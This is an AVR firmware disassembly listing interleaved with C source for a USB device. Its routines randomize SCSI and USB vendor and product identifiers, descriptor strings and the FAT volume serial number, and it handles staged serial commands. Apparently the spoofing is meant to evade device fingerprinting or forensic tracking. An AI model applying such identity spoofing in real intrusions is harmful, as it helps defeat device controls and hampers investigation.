     82e:	09 f4       	brne	.+2      	; 0x832 <scsi_hook_productvendor_id_randomize+0x18>
     830:	4f c0       	rjmp	.+158    	; 0x8d0 <scsi_hook_productvendor_id_randomize+0xb6>
     832:	7b 01       	movw	r14, r22
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
     834:	80 91 36 09 	lds	r24, 0x0936	; 0x800936 <init.2594>
     838:	81 11       	cpse	r24, r1
     83a:	1b c0       	rjmp	.+54     	; 0x872 <scsi_hook_productvendor_id_randomize+0x58>
    {
        init = true;
     83c:	81 e0       	ldi	r24, 0x01	; 1
     83e:	80 93 36 09 	sts	0x0936, r24	; 0x800936 <init.2594>
        for (size_t i = 0; i < sizeof(charset); i++)
     842:	c0 e0       	ldi	r28, 0x00	; 0
     844:	d0 e0       	ldi	r29, 0x00	; 0
     846:	12 c0       	rjmp	.+36     	; 0x86c <scsi_hook_productvendor_id_randomize+0x52>
        {
            charset[i] = (myrand() % ('Z' + 1 - 'A')) + 'A';
     848:	75 df       	rcall	.-278    	; 0x734 <myrand>
     84a:	fe 01       	movw	r30, r28
     84c:	ea 5d       	subi	r30, 0xDA	; 218
     84e:	f6 4f       	sbci	r31, 0xF6	; 246
     850:	9f e4       	ldi	r25, 0x4F	; 79
     852:	89 9f       	mul	r24, r25
     854:	91 2d       	mov	r25, r1
     856:	11 24       	eor	r1, r1
     858:	96 95       	lsr	r25
     85a:	96 95       	lsr	r25
     85c:	96 95       	lsr	r25
     85e:	2a e1       	ldi	r18, 0x1A	; 26
     860:	92 9f       	mul	r25, r18
     862:	80 19       	sub	r24, r0
     864:	11 24       	eor	r1, r1
     866:	8f 5b       	subi	r24, 0xBF	; 191
     868:	80 83       	st	Z, r24
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
     86a:	21 96       	adiw	r28, 0x01	; 1
     86c:	c0 31       	cpi	r28, 0x10	; 16
     86e:	d1 05       	cpc	r29, r1
     870:	58 f3       	brcs	.-42     	; 0x848 <scsi_hook_productvendor_id_randomize+0x2e>
            charset[i] = (myrand() % ('Z' + 1 - 'A')) + 'A';
        }

    }

    char* vendor_ptr = strstr((char*)vendor_id, "RNN");
     872:	69 e2       	ldi	r22, 0x29	; 41
     874:	73 e0       	ldi	r23, 0x03	; 3
     876:	c8 01       	movw	r24, r16
     878:	0e 94 30 39 	call	0x7260	; 0x7260 <strstr>
     87c:	dc 01       	movw	r26, r24
    if (NULL != vendor_ptr)
     87e:	89 2b       	or	r24, r25
     880:	51 f4       	brne	.+20     	; 0x896 <scsi_hook_productvendor_id_randomize+0x7c>
     882:	0e c0       	rjmp	.+28     	; 0x8a0 <scsi_hook_productvendor_id_randomize+0x86>
    {
        int i = 0;
        while (*vendor_ptr != '\0')
        {
            *vendor_ptr = charset[i % sizeof(charset)];
     884:	fc 01       	movw	r30, r24
     886:	ef 70       	andi	r30, 0x0F	; 15
     888:	ff 27       	eor	r31, r31
     88a:	ea 5d       	subi	r30, 0xDA	; 218
     88c:	f6 4f       	sbci	r31, 0xF6	; 246
     88e:	20 81       	ld	r18, Z
     890:	2d 93       	st	X+, r18
            vendor_ptr++;
            i++;
     892:	01 96       	adiw	r24, 0x01	; 1
     894:	02 c0       	rjmp	.+4      	; 0x89a <scsi_hook_productvendor_id_randomize+0x80>
     896:	80 e0       	ldi	r24, 0x00	; 0
     898:	90 e0       	ldi	r25, 0x00	; 0

    char* vendor_ptr = strstr((char*)vendor_id, "RNN");
    if (NULL != vendor_ptr)
    {
        int i = 0;
        while (*vendor_ptr != '\0')
     89a:	2c 91       	ld	r18, X
     89c:	21 11       	cpse	r18, r1
     89e:	f2 cf       	rjmp	.-28     	; 0x884 <scsi_hook_productvendor_id_randomize+0x6a>
            *vendor_ptr = charset[i % sizeof(charset)];
            vendor_ptr++;
            i++;
        }
    }
    char* product_ptr = strstr((char*)product_id, "RNN");
     8a0:	69 e2       	ldi	r22, 0x29	; 41
     8a2:	73 e0       	ldi	r23, 0x03	; 3
     8a4:	c7 01       	movw	r24, r14
     8a6:	0e 94 30 39 	call	0x7260	; 0x7260 <strstr>
     8aa:	dc 01       	movw	r26, r24
    if (NULL != product_ptr)
     8ac:	89 2b       	or	r24, r25
     8ae:	59 f4       	brne	.+22     	; 0x8c6 <scsi_hook_productvendor_id_randomize+0xac>
     8b0:	0f c0       	rjmp	.+30     	; 0x8d0 <scsi_hook_productvendor_id_randomize+0xb6>
    {
        int i = 0;
        while (*product_ptr != '\0')
        {
            *product_ptr = charset[(i + 5) % sizeof(charset)];
     8b2:	fc 01       	movw	r30, r24
     8b4:	35 96       	adiw	r30, 0x05	; 5
     8b6:	ef 70       	andi	r30, 0x0F	; 15
     8b8:	ff 27       	eor	r31, r31
     8ba:	ea 5d       	subi	r30, 0xDA	; 218
     8bc:	f6 4f       	sbci	r31, 0xF6	; 246
     8be:	20 81       	ld	r18, Z
     8c0:	2d 93       	st	X+, r18
            product_ptr++;
            i++;
     8c2:	01 96       	adiw	r24, 0x01	; 1
     8c4:	02 c0       	rjmp	.+4      	; 0x8ca <scsi_hook_productvendor_id_randomize+0xb0>
     8c6:	80 e0       	ldi	r24, 0x00	; 0
     8c8:	90 e0       	ldi	r25, 0x00	; 0
    }
    char* product_ptr = strstr((char*)product_id, "RNN");
    if (NULL != product_ptr)
    {
        int i = 0;
        while (*product_ptr != '\0')
     8ca:	2c 91       	ld	r18, X
     8cc:	21 11       	cpse	r18, r1
     8ce:	f1 cf       	rjmp	.-30     	; 0x8b2 <scsi_hook_productvendor_id_randomize+0x98>
            *product_ptr = charset[(i + 5) % sizeof(charset)];
            product_ptr++;
            i++;
        }
    }
}
     8d0:	df 91       	pop	r29
     8d2:	cf 91       	pop	r28
     8d4:	1f 91       	pop	r17
     8d6:	0f 91       	pop	r16
     8d8:	ff 90       	pop	r15
     8da:	ef 90       	pop	r14
     8dc:	08 95       	ret

000008de <usb_decriptor_hook_manufact_prod>:

void(*SCSI_DREG_HOOK_VENDORPRODUCT_ID)(uint8_t vendor_id[8],
                                       uint8_t product_id[16]) = scsi_hook_productvendor_id_randomize;

void usb_decriptor_hook_manufact_prod(wchar_t* Manufacturer_Product)
{
     8de:	0f 93       	push	r16
     8e0:	1f 93       	push	r17
     8e2:	cf 93       	push	r28
     8e4:	df 93       	push	r29
     8e6:	ec 01       	movw	r28, r24
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
     8e8:	80 91 83 09 	lds	r24, 0x0983	; 0x800983 <eppr_vars+0x1>
     8ec:	83 30       	cpi	r24, 0x03	; 3
     8ee:	d1 f1       	breq	.+116    	; 0x964 <usb_decriptor_hook_manufact_prod+0x86>
    {
        return;
    }
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
     8f0:	80 91 25 09 	lds	r24, 0x0925	; 0x800925 <init.2616>
     8f4:	81 11       	cpse	r24, r1
     8f6:	1c c0       	rjmp	.+56     	; 0x930 <usb_decriptor_hook_manufact_prod+0x52>
    {
        init = true;
     8f8:	81 e0       	ldi	r24, 0x01	; 1
     8fa:	80 93 25 09 	sts	0x0925, r24	; 0x800925 <init.2616>
        for (size_t i = 0; i < sizeof(charset); i++)
     8fe:	00 e0       	ldi	r16, 0x00	; 0
     900:	10 e0       	ldi	r17, 0x00	; 0
     902:	13 c0       	rjmp	.+38     	; 0x92a <usb_decriptor_hook_manufact_prod+0x4c>
        {
            charset[i] = (myrand() % ('z' + 1 - 'a')) + 'a';
     904:	17 df       	rcall	.-466    	; 0x734 <myrand>
     906:	f8 01       	movw	r30, r16
     908:	eb 5e       	subi	r30, 0xEB	; 235
     90a:	f6 4f       	sbci	r31, 0xF6	; 246
     90c:	9f e4       	ldi	r25, 0x4F	; 79
     90e:	89 9f       	mul	r24, r25
     910:	91 2d       	mov	r25, r1
     912:	11 24       	eor	r1, r1
     914:	96 95       	lsr	r25
     916:	96 95       	lsr	r25
     918:	96 95       	lsr	r25
     91a:	2a e1       	ldi	r18, 0x1A	; 26
     91c:	92 9f       	mul	r25, r18
     91e:	80 19       	sub	r24, r0
     920:	11 24       	eor	r1, r1
     922:	8f 59       	subi	r24, 0x9F	; 159
     924:	80 83       	st	Z, r24
    static bool init;
    static uint8_t charset[0x10];
    if (!init)
    {
        init = true;
        for (size_t i = 0; i < sizeof(charset); i++)
     926:	0f 5f       	subi	r16, 0xFF	; 255
     928:	1f 4f       	sbci	r17, 0xFF	; 255
     92a:	00 31       	cpi	r16, 0x10	; 16
     92c:	11 05       	cpc	r17, r1
     92e:	50 f3       	brcs	.-44     	; 0x904 <usb_decriptor_hook_manufact_prod+0x26>
    bool start_ran = false;
    while (*Manufacturer_Product != 0)
    {
        if ('R' == *Manufacturer_Product)
        {
            start_ran = true;
     930:	40 e0       	ldi	r20, 0x00	; 0
     932:	20 e0       	ldi	r18, 0x00	; 0
     934:	30 e0       	ldi	r19, 0x00	; 0
     936:	12 c0       	rjmp	.+36     	; 0x95c <usb_decriptor_hook_manufact_prod+0x7e>
    }
    int i = 0;
    bool start_ran = false;
    while (*Manufacturer_Product != 0)
    {
        if ('R' == *Manufacturer_Product)
     938:	82 35       	cpi	r24, 0x52	; 82
     93a:	91 05       	cpc	r25, r1
     93c:	09 f4       	brne	.+2      	; 0x940 <usb_decriptor_hook_manufact_prod+0x62>
        {
            start_ran = true;
     93e:	41 e0       	ldi	r20, 0x01	; 1
        }
        if (start_ran)
     940:	44 23       	and	r20, r20
     942:	49 f0       	breq	.+18     	; 0x956 <usb_decriptor_hook_manufact_prod+0x78>
        {
            *Manufacturer_Product = charset[i % sizeof(charset)];
     944:	f9 01       	movw	r30, r18
     946:	ef 70       	andi	r30, 0x0F	; 15
     948:	ff 27       	eor	r31, r31
     94a:	eb 5e       	subi	r30, 0xEB	; 235
     94c:	f6 4f       	sbci	r31, 0xF6	; 246
     94e:	80 81       	ld	r24, Z
     950:	90 e0       	ldi	r25, 0x00	; 0
     952:	99 83       	std	Y+1, r25	; 0x01
     954:	88 83       	st	Y, r24
        }
        Manufacturer_Product++;
     956:	22 96       	adiw	r28, 0x02	; 2
        i++;
     958:	2f 5f       	subi	r18, 0xFF	; 255
     95a:	3f 4f       	sbci	r19, 0xFF	; 255
            charset[i] = (myrand() % ('z' + 1 - 'a')) + 'a';
        }
    }
    int i = 0;
    bool start_ran = false;
    while (*Manufacturer_Product != 0)
     95c:	88 81       	ld	r24, Y
     95e:	99 81       	ldd	r25, Y+1	; 0x01
     960:	00 97       	sbiw	r24, 0x00	; 0
     962:	51 f7       	brne	.-44     	; 0x938 <usb_decriptor_hook_manufact_prod+0x5a>
            *Manufacturer_Product = charset[i % sizeof(charset)];
        }
        Manufacturer_Product++;
        i++;
    }
}
     964:	df 91       	pop	r29
     966:	cf 91       	pop	r28
     968:	1f 91       	pop	r17
     96a:	0f 91       	pop	r16
     96c:	08 95       	ret

0000096e <usb_decriptor_hook_productvendorid>:
void(*USBDESCRITPOR_DREG_HOOK_MANUFACT_PRODC)(wchar_t* Manufacturer_Product) =
    usb_decriptor_hook_manufact_prod;

void usb_decriptor_hook_productvendorid(uint16_t* vendor_id,
                                        uint16_t* product_id)
{
     96e:	ef 92       	push	r14
     970:	ff 92       	push	r15
     972:	0f 93       	push	r16
     974:	1f 93       	push	r17
     976:	cf 93       	push	r28
     978:	df 93       	push	r29
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
     97a:	20 91 83 09 	lds	r18, 0x0983	; 0x800983 <eppr_vars+0x1>
     97e:	23 30       	cpi	r18, 0x03	; 3
     980:	79 f1       	breq	.+94     	; 0x9e0 <usb_decriptor_hook_productvendorid+0x72>
        return;
    }
    static uint16_t vendor_id_rand;
    static uint16_t product_id_rand;

    if (vendor_id_rand == 0)
     982:	20 91 13 09 	lds	r18, 0x0913	; 0x800913 <vendor_id_rand.2633>
     986:	30 91 14 09 	lds	r19, 0x0914	; 0x800914 <vendor_id_rand.2633+0x1>
     98a:	23 2b       	or	r18, r19
     98c:	39 f4       	brne	.+14     	; 0x99c <usb_decriptor_hook_productvendorid+0x2e>
    {
        vendor_id_rand = *vendor_id;
     98e:	fc 01       	movw	r30, r24
     990:	20 81       	ld	r18, Z
     992:	31 81       	ldd	r19, Z+1	; 0x01
     994:	30 93 14 09 	sts	0x0914, r19	; 0x800914 <vendor_id_rand.2633+0x1>
     998:	20 93 13 09 	sts	0x0913, r18	; 0x800913 <vendor_id_rand.2633>
     99c:	8b 01       	movw	r16, r22
     99e:	ec 01       	movw	r28, r24
    }

    if (product_id_rand == 0)
     9a0:	80 91 11 09 	lds	r24, 0x0911	; 0x800911 <product_id_rand.2634>
     9a4:	90 91 12 09 	lds	r25, 0x0912	; 0x800912 <product_id_rand.2634+0x1>
     9a8:	89 2b       	or	r24, r25
     9aa:	69 f4       	brne	.+26     	; 0x9c6 <usb_decriptor_hook_productvendorid+0x58>
    {
        product_id_rand = (*product_id) + (myrand() % 0x0100) + 1;
     9ac:	fb 01       	movw	r30, r22
     9ae:	e0 80       	ld	r14, Z
     9b0:	f1 80       	ldd	r15, Z+1	; 0x01
     9b2:	c0 de       	rcall	.-640    	; 0x734 <myrand>
     9b4:	e8 0e       	add	r14, r24
     9b6:	f1 1c       	adc	r15, r1
     9b8:	ff ef       	ldi	r31, 0xFF	; 255
     9ba:	ef 1a       	sub	r14, r31
     9bc:	ff 0a       	sbc	r15, r31
     9be:	f0 92 12 09 	sts	0x0912, r15	; 0x800912 <product_id_rand.2634+0x1>
     9c2:	e0 92 11 09 	sts	0x0911, r14	; 0x800911 <product_id_rand.2634>
    }

    *vendor_id = vendor_id_rand;
     9c6:	80 91 13 09 	lds	r24, 0x0913	; 0x800913 <vendor_id_rand.2633>
     9ca:	90 91 14 09 	lds	r25, 0x0914	; 0x800914 <vendor_id_rand.2633+0x1>
     9ce:	99 83       	std	Y+1, r25	; 0x01
     9d0:	88 83       	st	Y, r24
    *product_id = product_id_rand;
     9d2:	80 91 11 09 	lds	r24, 0x0911	; 0x800911 <product_id_rand.2634>
     9d6:	90 91 12 09 	lds	r25, 0x0912	; 0x800912 <product_id_rand.2634+0x1>
     9da:	f8 01       	movw	r30, r16
     9dc:	91 83       	std	Z+1, r25	; 0x01
     9de:	80 83       	st	Z, r24
}
     9e0:	df 91       	pop	r29
     9e2:	cf 91       	pop	r28
     9e4:	1f 91       	pop	r17
     9e6:	0f 91       	pop	r16
     9e8:	ff 90       	pop	r15
     9ea:	ef 90       	pop	r14
     9ec:	08 95       	ret

000009ee <hook_boot_record>:
    uint8_t  bootSectorSig0;
    uint8_t  bootSectorSig1;
};

void hook_boot_record(uint8_t boot_sector[512])
{
     9ee:	cf 93       	push	r28
     9f0:	df 93       	push	r29
     9f2:	9c 01       	movw	r18, r24
    if (eppr_vars.curr_stage == STAG_ONLYMASS)
     9f4:	90 91 83 09 	lds	r25, 0x0983	; 0x800983 <eppr_vars+0x1>
     9f8:	93 30       	cpi	r25, 0x03	; 3
     9fa:	49 f1       	breq	.+82     	; 0xa4e <hook_boot_record+0x60>
     9fc:	e9 01       	movw	r28, r18
    }
    static uint32_t boot_serial_rand = 0;
    struct fat_boot* fat_boot = (struct fat_boot*) boot_sector;
    //printf("boot sector signature: 0x%lX\n", fat_boot->volumeSerialNumber);

    if (0 == boot_serial_rand)
     9fe:	80 91 0d 09 	lds	r24, 0x090D	; 0x80090d <boot_serial_rand.2665>
     a02:	90 91 0e 09 	lds	r25, 0x090E	; 0x80090e <boot_serial_rand.2665+0x1>
     a06:	a0 91 0f 09 	lds	r26, 0x090F	; 0x80090f <boot_serial_rand.2665+0x2>
     a0a:	b0 91 10 09 	lds	r27, 0x0910	; 0x800910 <boot_serial_rand.2665+0x3>
     a0e:	89 2b       	or	r24, r25
     a10:	8a 2b       	or	r24, r26
     a12:	8b 2b       	or	r24, r27
     a14:	81 f4       	brne	.+32     	; 0xa36 <hook_boot_record+0x48>
    {
        boot_serial_rand = (myrand() % (0xBEBACAFE + 1 - 0xCEDACAFE)) + 0xCEDACAFE;
     a16:	8e de       	rcall	.-740    	; 0x734 <myrand>
     a18:	90 e0       	ldi	r25, 0x00	; 0
     a1a:	a0 e0       	ldi	r26, 0x00	; 0
     a1c:	b0 e0       	ldi	r27, 0x00	; 0
     a1e:	82 50       	subi	r24, 0x02	; 2
     a20:	95 43       	sbci	r25, 0x35	; 53
     a22:	a5 42       	sbci	r26, 0x25	; 37
     a24:	b1 43       	sbci	r27, 0x31	; 49
     a26:	80 93 0d 09 	sts	0x090D, r24	; 0x80090d <boot_serial_rand.2665>
     a2a:	90 93 0e 09 	sts	0x090E, r25	; 0x80090e <boot_serial_rand.2665+0x1>
     a2e:	a0 93 0f 09 	sts	0x090F, r26	; 0x80090f <boot_serial_rand.2665+0x2>
     a32:	b0 93 10 09 	sts	0x0910, r27	; 0x800910 <boot_serial_rand.2665+0x3>
    }

    fat_boot->volumeSerialNumber = boot_serial_rand;
     a36:	80 91 0d 09 	lds	r24, 0x090D	; 0x80090d <boot_serial_rand.2665>
     a3a:	90 91 0e 09 	lds	r25, 0x090E	; 0x80090e <boot_serial_rand.2665+0x1>
     a3e:	a0 91 0f 09 	lds	r26, 0x090F	; 0x80090f <boot_serial_rand.2665+0x2>
     a42:	b0 91 10 09 	lds	r27, 0x0910	; 0x800910 <boot_serial_rand.2665+0x3>
     a46:	8f a3       	std	Y+39, r24	; 0x27
     a48:	98 a7       	std	Y+40, r25	; 0x28
     a4a:	a9 a7       	std	Y+41, r26	; 0x29
     a4c:	ba a7       	std	Y+42, r27	; 0x2a
}
     a4e:	df 91       	pop	r29
     a50:	cf 91       	pop	r28
     a52:	08 95       	ret

00000a54 <mystricmp>:
    return recv_from_serial_until(buffer,
                                  max_nbytes,
                                  (unsigned char*) NLS,
                                  SNLS,
                                  max_tries);
}
     a54:	af 92       	push	r10
     a56:	bf 92       	push	r11
     a58:	cf 92       	push	r12
     a5a:	df 92       	push	r13
     a5c:	ef 92       	push	r14
     a5e:	ff 92       	push	r15
     a60:	1f 93       	push	r17
     a62:	cf 93       	push	r28
     a64:	df 93       	push	r29
     a66:	fc 01       	movw	r30, r24
     a68:	eb 01       	movw	r28, r22
     a6a:	5f 01       	movw	r10, r30
     a6c:	2f ef       	ldi	r18, 0xFF	; 255
     a6e:	a2 1a       	sub	r10, r18
     a70:	b2 0a       	sbc	r11, r18
     a72:	80 81       	ld	r24, Z
     a74:	90 e0       	ldi	r25, 0x00	; 0
     a76:	0e 94 f7 38 	call	0x71ee	; 0x71ee <toupper>
     a7a:	7c 01       	movw	r14, r24
     a7c:	6e 01       	movw	r12, r28
     a7e:	3f ef       	ldi	r19, 0xFF	; 255
     a80:	c3 1a       	sub	r12, r19
     a82:	d3 0a       	sbc	r13, r19
     a84:	88 81       	ld	r24, Y
     a86:	90 e0       	ldi	r25, 0x00	; 0
     a88:	0e 94 f7 38 	call	0x71ee	; 0x71ee <toupper>
     a8c:	e1 10       	cpse	r14, r1
     a8e:	06 c0       	rjmp	.+12     	; 0xa9c <mystricmp+0x48>
     a90:	ff 24       	eor	r15, r15
     a92:	97 01       	movw	r18, r14
     a94:	28 1b       	sub	r18, r24
     a96:	31 09       	sbc	r19, r1
     a98:	c9 01       	movw	r24, r18
     a9a:	09 c0       	rjmp	.+18     	; 0xaae <mystricmp+0x5a>
     a9c:	f5 01       	movw	r30, r10
     a9e:	e6 01       	movw	r28, r12
     aa0:	e8 16       	cp	r14, r24
     aa2:	19 f3       	breq	.-58     	; 0xa6a <mystricmp+0x16>
     aa4:	ff 24       	eor	r15, r15
     aa6:	97 01       	movw	r18, r14
     aa8:	28 1b       	sub	r18, r24
     aaa:	31 09       	sbc	r19, r1
     aac:	c9 01       	movw	r24, r18
     aae:	df 91       	pop	r29
     ab0:	cf 91       	pop	r28
     ab2:	1f 91       	pop	r17
     ab4:	ff 90       	pop	r15
     ab6:	ef 90       	pop	r14
     ab8:	df 90       	pop	r13
     aba:	cf 90       	pop	r12
     abc:	bf 90       	pop	r11
     abe:	af 90       	pop	r10
     ac0:	08 95       	ret

00000ac2 <flush_serial_input>:
     ac2:	20 e0       	ldi	r18, 0x00	; 0
     ac4:	30 e0       	ldi	r19, 0x00	; 0
     ac6:	0e c0       	rjmp	.+28     	; 0xae4 <flush_serial_input+0x22>
     ac8:	80 91 c8 00 	lds	r24, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
     acc:	88 23       	and	r24, r24
     ace:	24 f4       	brge	.+8      	; 0xad8 <flush_serial_input+0x16>
     ad0:	80 91 ce 00 	lds	r24, 0x00CE	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
     ad4:	90 e0       	ldi	r25, 0x00	; 0
     ad6:	02 c0       	rjmp	.+4      	; 0xadc <flush_serial_input+0x1a>
     ad8:	8f ef       	ldi	r24, 0xFF	; 255
     ada:	9f ef       	ldi	r25, 0xFF	; 255
     adc:	01 96       	adiw	r24, 0x01	; 1
     ade:	a1 f7       	brne	.-24     	; 0xac8 <flush_serial_input+0x6>
     ae0:	2f 5f       	subi	r18, 0xFF	; 255
     ae2:	3f 4f       	sbci	r19, 0xFF	; 255
     ae4:	24 36       	cpi	r18, 0x64	; 100
     ae6:	31 05       	cpc	r19, r1
     ae8:	7c f3       	brlt	.-34     	; 0xac8 <flush_serial_input+0x6>
     aea:	08 95       	ret

00000aec <recv_from_serial>:
     aec:	8f 92       	push	r8
     aee:	9f 92       	push	r9
     af0:	af 92       	push	r10
     af2:	bf 92       	push	r11
     af4:	cf 92       	push	r12
     af6:	df 92       	push	r13
     af8:	ef 92       	push	r14
     afa:	ff 92       	push	r15
     afc:	0f 93       	push	r16
     afe:	1f 93       	push	r17
     b00:	cf 93       	push	r28
     b02:	df 93       	push	r29
     b04:	dc 01       	movw	r26, r24
     b06:	4a 01       	movw	r8, r20
     b08:	5b 01       	movw	r10, r22
     b0a:	89 2b       	or	r24, r25
     b0c:	09 f4       	brne	.+2      	; 0xb10 <recv_from_serial+0x24>
     b0e:	4c c0       	rjmp	.+152    	; 0xba8 <recv_from_serial+0xbc>
     b10:	45 2b       	or	r20, r21
     b12:	46 2b       	or	r20, r22
     b14:	47 2b       	or	r20, r23
     b16:	09 f4       	brne	.+2      	; 0xb1a <recv_from_serial+0x2e>
     b18:	49 c0       	rjmp	.+146    	; 0xbac <recv_from_serial+0xc0>
     b1a:	60 e0       	ldi	r22, 0x00	; 0
     b1c:	70 e0       	ldi	r23, 0x00	; 0
     b1e:	38 c0       	rjmp	.+112    	; 0xb90 <recv_from_serial+0xa4>
     b20:	c1 14       	cp	r12, r1
     b22:	d1 04       	cpc	r13, r1
     b24:	e1 04       	cpc	r14, r1
     b26:	f1 04       	cpc	r15, r1
     b28:	01 f1       	breq	.+64     	; 0xb6a <recv_from_serial+0x7e>
     b2a:	81 e0       	ldi	r24, 0x01	; 1
     b2c:	c8 1a       	sub	r12, r24
     b2e:	d1 08       	sbc	r13, r1
     b30:	e1 08       	sbc	r14, r1
     b32:	f1 08       	sbc	r15, r1
     b34:	d1 f4       	brne	.+52     	; 0xb6a <recv_from_serial+0x7e>
     b36:	fd 01       	movw	r30, r26
     b38:	e6 0f       	add	r30, r22
     b3a:	f7 1f       	adc	r31, r23
     b3c:	10 82       	st	Z, r1
     b3e:	bf 93       	push	r27
     b40:	af 93       	push	r26
     b42:	7f 93       	push	r23
     b44:	6f 93       	push	r22
     b46:	8d e2       	ldi	r24, 0x2D	; 45
     b48:	93 e0       	ldi	r25, 0x03	; 3
     b4a:	9f 93       	push	r25
     b4c:	8f 93       	push	r24
     b4e:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
     b52:	0f 90       	pop	r0
     b54:	0f 90       	pop	r0
     b56:	0f 90       	pop	r0
     b58:	0f 90       	pop	r0
     b5a:	0f 90       	pop	r0
     b5c:	0f 90       	pop	r0
     b5e:	80 e0       	ldi	r24, 0x00	; 0
     b60:	26 c0       	rjmp	.+76     	; 0xbae <recv_from_serial+0xc2>
     b62:	c0 2e       	mov	r12, r16
     b64:	d1 2e       	mov	r13, r17
     b66:	e2 2e       	mov	r14, r18
     b68:	f3 2e       	mov	r15, r19
     b6a:	90 91 c8 00 	lds	r25, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
     b6e:	99 23       	and	r25, r25
     b70:	bc f6       	brge	.-82     	; 0xb20 <recv_from_serial+0x34>
     b72:	ed 01       	movw	r28, r26
     b74:	c6 0f       	add	r28, r22
     b76:	d7 1f       	adc	r29, r23
     b78:	80 91 c8 00 	lds	r24, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
     b7c:	88 23       	and	r24, r24
     b7e:	1c f4       	brge	.+6      	; 0xb86 <recv_from_serial+0x9a>
     b80:	e0 91 ce 00 	lds	r30, 0x00CE	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
     b84:	02 c0       	rjmp	.+4      	; 0xb8a <recv_from_serial+0x9e>
     b86:	ef ef       	ldi	r30, 0xFF	; 255
     b88:	ff ef       	ldi	r31, 0xFF	; 255
     b8a:	e8 83       	st	Y, r30
     b8c:	6f 5f       	subi	r22, 0xFF	; 255
     b8e:	7f 4f       	sbci	r23, 0xFF	; 255
     b90:	6b 01       	movw	r12, r22
     b92:	07 2e       	mov	r0, r23
     b94:	00 0c       	add	r0, r0
     b96:	ee 08       	sbc	r14, r14
     b98:	ff 08       	sbc	r15, r15
     b9a:	c8 14       	cp	r12, r8
     b9c:	d9 04       	cpc	r13, r9
     b9e:	ea 04       	cpc	r14, r10
     ba0:	fb 04       	cpc	r15, r11
     ba2:	f8 f2       	brcs	.-66     	; 0xb62 <recv_from_serial+0x76>
     ba4:	81 e0       	ldi	r24, 0x01	; 1
     ba6:	03 c0       	rjmp	.+6      	; 0xbae <recv_from_serial+0xc2>
     ba8:	80 e0       	ldi	r24, 0x00	; 0
     baa:	01 c0       	rjmp	.+2      	; 0xbae <recv_from_serial+0xc2>
     bac:	80 e0       	ldi	r24, 0x00	; 0
     bae:	df 91       	pop	r29
     bb0:	cf 91       	pop	r28
     bb2:	1f 91       	pop	r17
     bb4:	0f 91       	pop	r16
     bb6:	ff 90       	pop	r15
     bb8:	ef 90       	pop	r14
     bba:	df 90       	pop	r13
     bbc:	cf 90       	pop	r12
     bbe:	bf 90       	pop	r11
     bc0:	af 90       	pop	r10
     bc2:	9f 90       	pop	r9
     bc4:	8f 90       	pop	r8
     bc6:	08 95       	ret

00000bc8 <send_cmd>:


unsigned int send_cmd(CMD_t* cmd, void* ext)
{
     bc8:	cf 92       	push	r12
     bca:	df 92       	push	r13
     bcc:	ef 92       	push	r14
     bce:	ff 92       	push	r15
     bd0:	0f 93       	push	r16
     bd2:	1f 93       	push	r17
     bd4:	cf 93       	push	r28
     bd6:	df 93       	push	r29
     bd8:	00 d0       	rcall	.+0      	; 0xbda <send_cmd+0x12>
     bda:	00 d0       	rcall	.+0      	; 0xbdc <send_cmd+0x14>
     bdc:	1f 92       	push	r1
     bde:	cd b7       	in	r28, 0x3d	; 61
     be0:	de b7       	in	r29, 0x3e	; 62
     be2:	8c 01       	movw	r16, r24
     be4:	6b 01       	movw	r12, r22
    flush_serial_input();
     be6:	6d df       	rcall	.-294    	; 0xac2 <flush_serial_input>
    
    printf("\r\n%s\r\n", cmd->cmd);
     be8:	f8 01       	movw	r30, r16
     bea:	81 81       	ldd	r24, Z+1	; 0x01
     bec:	8f 93       	push	r24
     bee:	80 81       	ld	r24, Z
     bf0:	8f 93       	push	r24
     bf2:	80 e9       	ldi	r24, 0x90	; 144
     bf4:	96 e0       	ldi	r25, 0x06	; 6
     bf6:	9f 93       	push	r25
     bf8:	8f 93       	push	r24
     bfa:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
  
    if (strcmp(cmd->cmd, PRLE_CMD_AM_I_IN_STAGE2) == 0)
     bfe:	f8 01       	movw	r30, r16
     c00:	e0 80       	ld	r14, Z
     c02:	f1 80       	ldd	r15, Z+1	; 0x01
     c04:	62 e7       	ldi	r22, 0x72	; 114
     c06:	73 e0       	ldi	r23, 0x03	; 3
     c08:	c7 01       	movw	r24, r14
     c0a:	0e 94 27 39 	call	0x724e	; 0x724e <strcmp>
     c0e:	0f 90       	pop	r0
     c10:	0f 90       	pop	r0
     c12:	0f 90       	pop	r0
     c14:	0f 90       	pop	r0
     c16:	89 2b       	or	r24, r25
     c18:	81 f5       	brne	.+96     	; 0xc7a <send_cmd+0xb2>
    {
        char cmd_recv[SIZE_PRLE_CMD + 1] = { 0 };
     c1a:	ce 01       	movw	r24, r28
     c1c:	01 96       	adiw	r24, 0x01	; 1
     c1e:	25 e0       	ldi	r18, 0x05	; 5
     c20:	fc 01       	movw	r30, r24
     c22:	11 92       	st	Z+, r1
     c24:	2a 95       	dec	r18
     c26:	e9 f7       	brne	.-6      	; 0xc22 <send_cmd+0x5a>
        if (recv_from_serial((unsigned char*)cmd_recv, SIZE_PRLE_CMD, 3000))
     c28:	08 eb       	ldi	r16, 0xB8	; 184
     c2a:	1b e0       	ldi	r17, 0x0B	; 11
     c2c:	20 e0       	ldi	r18, 0x00	; 0
     c2e:	30 e0       	ldi	r19, 0x00	; 0
     c30:	44 e0       	ldi	r20, 0x04	; 4
     c32:	50 e0       	ldi	r21, 0x00	; 0
     c34:	60 e0       	ldi	r22, 0x00	; 0
     c36:	70 e0       	ldi	r23, 0x00	; 0
     c38:	59 df       	rcall	.-334    	; 0xaec <recv_from_serial>
     c3a:	88 23       	and	r24, r24
     c3c:	d9 f0       	breq	.+54     	; 0xc74 <send_cmd+0xac>
        {
            printf("\r\nrecv_resp: %s\r\n", cmd_recv);
